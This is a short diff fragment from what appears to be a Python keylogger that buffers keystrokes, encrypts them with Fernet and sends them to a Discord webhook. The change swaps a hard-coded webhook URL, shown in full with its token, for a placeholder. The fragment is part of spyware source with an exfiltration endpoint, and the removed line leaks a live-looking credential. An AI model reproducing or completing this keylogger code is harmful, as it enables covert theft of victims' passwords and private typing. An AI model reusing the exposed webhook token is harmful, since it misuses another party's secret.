@@ -20,7 +20,7 @@ else:
     cipher = Fernet(key)
 
 # Discord Webhook URL
-discord_webhook_url = "https://discord.com/api/webhooks/1311116235433574492/frXUQT2FN8NbTvzA5TCiZ2Moc_QLS56xT49_SaxZbwS-XfmDv815jOGYC3ozovFsuZsX"
+discord_webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
 
 # Buffer to collect keystrokes
 keystroke_buffer = []
